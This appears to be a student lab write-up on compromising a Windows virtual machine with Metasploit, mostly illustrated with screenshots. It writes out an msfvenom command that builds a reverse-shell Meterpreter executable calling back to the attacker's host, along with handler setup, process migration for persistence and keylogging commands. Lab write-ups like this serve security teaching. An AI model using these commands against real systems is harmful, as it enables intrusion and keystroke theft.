# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

### Find the attackers ip address using ifconfig.
![VirtualBox_kali-linux-2024 1-virtualbox-amd64_12_04_2024_10_32sudo](https://github.com/Narasimhan05/Compromising-windows-using-Metasploit/assets/132819871/117ec91a-4b9c-444b-ad6c-dd87219f0e80)

### Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe.
![VirtualBox_kali-linux-2024 1-virtualbox-amd64_12_04_2024_10_33sudo](https://github.com/Narasimhan05/Compromising-windows-using-Metasploit/assets/132819871/d90639e9-e408-401c-bae7-6a647733caa8)

### copy the fun.exe into the apache /var/www/html folder.

![VirtualBox_kali-linux-2024 1-virtualbox-amd64_12_04_2024_10_34sudo](https://github.com/Narasimhan05/Compromising-windows-using-Metasploit/assets/132819871/5ff3e96f-e5ce-407e-b046-4ffb05ba70fb)

### Start apache server sudo systemctl apache2 start.

![VirtualBox_kali-linux-2024 1-virtualbox-amd64_12_04_2024_10_35sudo](https://github.com/Narasimhan05/Compromising-windows-using-Metasploit/assets/132819871/8a53f274-a263-417b-b7e0-6f07d299c3c4)

### Check the status of apache2.

![VirtualBox_kali-linux-2024 1-virtualbox-amd64_12_04_2024_10_36sudo](https://github.com/Narasimhan05/Compromising-windows-using-Metasploit/assets/132819871/7362bd87-0d5c-44c0-9d4d-a85ddabd6a22)

### Invoke msfconsole:

![VirtualBox_kali-linux-2024 1-virtualbox-amd64_12_04_2024_10_37sudo](https://github.com/Narasimhan05/Compromising-windows-using-Metasploit/assets/132819871/0c544326-3706-491d-a940-ebbc59fdc17a)

### Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

![VirtualBox_kali-linux-2024 1-virtualbox-amd64_12_04_2024_10_38sudo](https://github.com/Narasimhan05/Compromising-windows-using-Metasploit/assets/132819871/0c90be19-cd35-4f30-9381-7046d49f5442)

### Starting a command and control Server use multi/handler

![VirtualBox_kali-linux-2024 1-virtualbox-amd64_12_04_2024_10_39sudo](https://github.com/Narasimhan05/Compromising-windows-using-Metasploit/assets/132819871/96b76e1e-e40c-4117-aa81-7a8415bec815)

### set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit

![VirtualBox_kali-linux-2024 1-virtualbox-amd64_12_04_2024_10_40sudo](https://github.com/Narasimhan05/Compromising-windows-using-Metasploit/assets/132819871/551a85fc-8923-46d9-afde-551290b502f9)

### Bypass any warning boxes, double-click the file, and allow it to run.

![VirtualBox_kali-linux-2024 1-virtualbox-amd64_12_04_2024_10_41sudo](https://github.com/Narasimhan05/Compromising-windows-using-Metasploit/assets/132819871/ad95d0f4-128d-43a3-8c5b-47bdf729adb0)

### To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

![VirtualBox_kali-linux-2024 1-virtualbox-amd64_12_04_2024_10_42sudo](https://github.com/Narasimhan05/Compromising-windows-using-Metasploit/assets/132819871/c5bcbe9f-7a25-4354-8e45-9caefc2c3a3c)

### The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:
migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted
![VirtualBox_kali-linux-2024 1-virtualbox-amd64_12_04_2024_10_43sudo](https://github.com/Narasimhan05/Compromising-windows-using-Metasploit/assets/132819871/e7cc3f6b-5b47-4bc7-8dd3-831434121244)

Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

![VirtualBox_kali-linux-2024 1-virtualbox-amd64_12_04_2024_10_42sudo](https://github.com/Narasimhan05/Compromising-windows-using-Metasploit/assets/132819871/4a6dfd61-aaaf-467a-a464-8ec7105400f8)

keyscan_dump Shows the keystrokes captured so far
![VirtualBox_kali-linux-2024 1-virtualbox-amd64_12_04_2024_10_42sudo](https://github.com/Narasimhan05/Compromising-windows-using-Metasploit/assets/132819871/03b4ffaa-004a-4cc3-b101-d12bf3db331d)

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
